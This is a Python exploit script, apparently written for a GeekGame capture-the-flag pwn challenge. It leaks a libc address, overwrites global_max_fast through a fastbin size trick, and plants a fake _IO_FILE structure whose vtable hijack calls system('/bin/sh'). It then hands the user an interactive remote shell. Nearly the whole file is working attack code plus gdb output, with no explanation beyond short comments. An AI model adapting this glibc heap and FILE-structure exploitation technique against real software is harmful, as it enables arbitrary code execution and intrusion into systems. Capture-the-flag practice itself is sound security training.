import time
import subprocess
#exe = "./a.out"
#exe = "./pwn"
exe = "nc prob07.geekgame.pku.edu.cn 10007"
proc = subprocess.Popen(exe, shell=True, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
def w(s):
	time.sleep(0.1)
	proc.stdin.write(s)
	print("SEND:", s[:100])
def r():
	time.sleep(0.1)
	s = proc.stdout.read(999999)
	print("RECV:", s)
	return s

def u64(v):
	return v.to_bytes(8, 'little')

w(b'(token)\n')
r()

# free() will write to 
#     main_arena.fastbinsY[index]          index = ((size+0x10)>>4) - 2
# &fastbinsY = main_arena+16
def makesize(target_addr_rel):
	assert target_addr_rel % 8 == 0
	main_arena = 0x3ebc40
	fastbinsY = main_arena + 16
	index = (target_addr_rel - fastbinsY) // 8
	size = ((index + 2) << 4) - 0x10
	print("makesize", hex(target_addr_rel), size)
	return str(size).encode()

w(makesize(0x3ec660)) # __GI__IO_list_all

r()

w(b'20480')
r()

w(b'y')
s = r()
print(s)
s = s[len('Now your name is:'):][:6]
leak = int.from_bytes(s, 'little')
base = leak - 0x7f5dd1188ca0 + 0x7f5dd0d9d000
print("leak", hex(leak))
print("base", hex(base))
input()

#w(u64(leak)+u64(leak))
#w(u64(0xabcdabcd)+u64(leak))
#w(u64(leak))
#w(u64(0xabcd1234))
#w(u64(leak)+u64(leak-4*8))

global_max_fast = base + 0x3ED940
print("global_max_fast", hex(global_max_fast))
w(u64(leak)+u64(global_max_fast-16))

r()
input()
w(b'1')
r()
input()

#w(b'abcd1111'+b'abcd2222'+b'abcd3333'+b'abcd4444'+b'abcd5555'+b'abcd6666'+b'abcd7777')
fake_file = []
for i in range(0,100):
	fake_file.append(0xaaaa0000+i)
"""
(gdb) print *(struct _IO_FILE_plus *)fp
$3 = {file = {_flags = 0, _IO_read_ptr = 0x1441 <error: Cannot access memory at address 0x1441>, 
    _IO_read_end = 0x7ff6cec5f680 <_IO_2_1_stderr_> "\206 \255", <incomplete sequence \373>, 
    _IO_read_base = 0xaaaa0001 <error: Cannot access memory at address 0xaaaa0001>, 
    _IO_write_base = 0xaaaa0002 <error: Cannot access memory at address 0xaaaa0002>, 
    _IO_write_ptr = 0xaaaa0003 <error: Cannot access memory at address 0xaaaa0003>, 
    _IO_write_end = 0xaaaa0004 <error: Cannot access memory at address 0xaaaa0004>, 
    _IO_buf_base = 0xaaaa0005 <error: Cannot access memory at address 0xaaaa0005>, 
    _IO_buf_end = 0xaaaa0006 <error: Cannot access memory at address 0xaaaa0006>, 
    _IO_save_base = 0xaaaa0007 <error: Cannot access memory at address 0xaaaa0007>, 
    _IO_backup_base = 0xaaaa0008 <error: Cannot access memory at address 0xaaaa0008>, 
    _IO_save_end = 0xaaaa0009 <error: Cannot access memory at address 0xaaaa0009>, _markers = 0xaaaa000a, _chain = 0xaaaa000b, 
    _fileno = -1431699444, _flags2 = 0, _old_offset = 2863267853, _cur_column = 14, _vtable_offset = -86 '\252', 
    _shortbuf = "\252", _lock = 0xaaaa000f, _offset = 2863267856, _codecvt = 0xaaaa0011, _wide_data = 0xaaaa0012, 
    _freeres_list = 0xaaaa0013, _freeres_buf = 0xaaaa0014, __pad5 = 2863267861, _mode = -1431699434, 
    _unused2 = "\000\000\000\000\027\000\252\252\000\000\000\000\030\000\252\252\000\000\000"}, vtable = 0xaaaa0019}

((gdb) print ((_IO_strfile *) fp)->_s._allocate_buffer
$4 = (_IO_alloc_type) 0xaaaa001a

(gdb) print/x fp->_mode
$6 = 0xaaaa0016

"""

binsh = base+0x1B40FA
system = base+0x4F4E0
_IO_str_jumps = base+0x3E8360
fake_file[0x02] = 0 # _IO_write_base
fake_file[0x03] = (binsh -100) // 2 +1 # _IO_write_ptr
fake_file[0x05] = 1 # _IO_buf_base
fake_file[0x06] = (binsh -100) // 2 +1  # _IO_buf_end 
fake_file[0x13] = 2 # _freeres_list
fake_file[0x14] = 3 # _freeres_buf
fake_file[0x16] = 0xFFFFFFFFFFFFFFFF # _mode  
fake_file[0x19] = _IO_str_jumps # vtable
fake_file[0x1a] = system

w(b''.join(map(u64, fake_file)))
r()
input()

w(b'ls -l\n')
r()

while True:
	w(input().encode()+b'\n')
	print(r().decode())
	


